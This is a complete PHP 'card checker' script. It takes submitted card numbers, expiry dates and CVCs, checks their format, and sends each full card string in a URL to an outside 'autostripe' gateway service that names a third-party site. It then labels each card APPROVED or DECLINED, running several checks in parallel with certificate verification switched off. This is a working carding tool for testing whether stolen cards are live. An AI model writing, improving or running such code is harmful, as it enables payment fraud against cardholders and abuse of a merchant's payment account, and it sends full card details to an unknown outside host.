<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Function to validate and normalize a single card
function validateCard($card) {
    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
    
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            return [
                'success' => false,
                'message' => "DECLINED [Missing $field] {$card['number']}|{$card['exp_month']}|{$card['exp_year']}|{$card['cvc']}"
            ];
        }
    }

    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        return [
            'success' => false,
            'message' => "DECLINED [Invalid exp_month format] $card_number|$exp_month|$exp_year_raw|$cvc"
        ];
    }

    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        return [
            'success' => false,
            'message' => "DECLINED [Invalid exp_year format - must be YY or YYYY] $card_number|$exp_month|$exp_year_raw|$cvc"
        ];
    }

    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        return [
            'success' => false,
            'message' => "DECLINED [Invalid card number format] $card_number|$exp_month|$exp_year|$cvc"
        ];
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
        return [
            'success' => false,
            'message' => "DECLINED [Invalid exp_year format after normalization] $card_number|$exp_month|$exp_year|$cvc"
        ];
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        return [
            'success' => false,
            'message' => "DECLINED [Invalid CVC format] $card_number|$exp_month|$exp_year|$cvc"
        ];
    }

    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        return [
            'success' => false,
            'message' => "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc"
        ];
    }

    return [
        'success' => true,
        'card' => [
            'number' => $card_number,
            'exp_month' => $exp_month,
            'exp_year' => $exp_year,
            'cvc' => $cvc,
            'original' => "$card_number|$exp_month|$exp_year_raw|$cvc"
        ]
    ];
}

// Function to check a single card via API
function checkCard($card_data) {
    $card_details = $card_data['original'];
    $encoded_cc = urlencode($card_details);
    
    $api_url = "https://rockyysoon.onrender.com/gateway=autostripe/key=rockysoon?site=shebrews.org&cc=$encoded_cc";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production

    return [
        'handle' => $ch,
        'card_details' => $card_details
    ];
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['cards']) || !is_array($_POST['cards'])) {
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

$cards = $_POST['cards'];
if (empty($cards)) {
    echo "DECLINED [No cards provided]";
    exit;
}

// Limit to 3 concurrent requests
$max_concurrent = 3;
$results = [];
$multi_handle = curl_multi_init();
$active_handles = [];
$card_queue = array_slice($cards, 0, $max_concurrent); // Take up to 3 cards

// Process up to 3 cards in parallel
foreach ($card_queue as $index => $card) {
    $validation = validateCard($card);
    if (!$validation['success']) {
        $results[] = $validation['message'];
        continue;
    }

    $curl_info = checkCard($validation['card']);
    $handle = $curl_info['handle'];
    curl_multi_add_handle($multi_handle, $handle);
    $active_handles[] = ['handle' => $handle, 'card_details' => $curl_info['card_details']];
}

// Execute parallel requests
do {
    $status = curl_multi_exec($multi_handle, $still_running);
    if ($still_running < count($active_handles)) {
        while ($info = curl_multi_info_read($multi_handle)) {
            $handle = $info['handle'];
            $response = curl_multi_getcontent($handle);
            $http_code = curl_getinfo($handle, CURLINFO_HTTP_CODE);
            $curl_error = curl_error($handle);

            $card_index = array_search($handle, array_column($active_handles, 'handle'));
            $card_details = $active_handles[$card_index]['card_details'];

            if ($response === false || $http_code !== 200 || !empty($curl_error)) {
                $results[] = "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
            } else {
                $result = json_decode($response, true);
                if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
                    $results[] = "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
                } else {
                    $status = strtoupper($result['status']);
                    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8');
                    if ($status === "APPROVED") {
                        $results[] = "APPROVED [$response_msg] $card_details";
                    } elseif ($status === "DECLINED") {
                        $results[] = "DECLINED [$response_msg] $card_details";
                    } else {
                        $results[] = "DECLINED [Unknown status: $status] $card_details";
                    }
                }
            }

            curl_multi_remove_handle($multi_handle, $handle);
            curl_close($handle);
            unset($active_handles[$card_index]);
            $active_handles = array_values($active_handles);
        }
    }
} while ($still_running > 0);

curl_multi_close($multi_handle);

// Output results
foreach ($results as $result) {
    echo $result . "\n";
}
?>
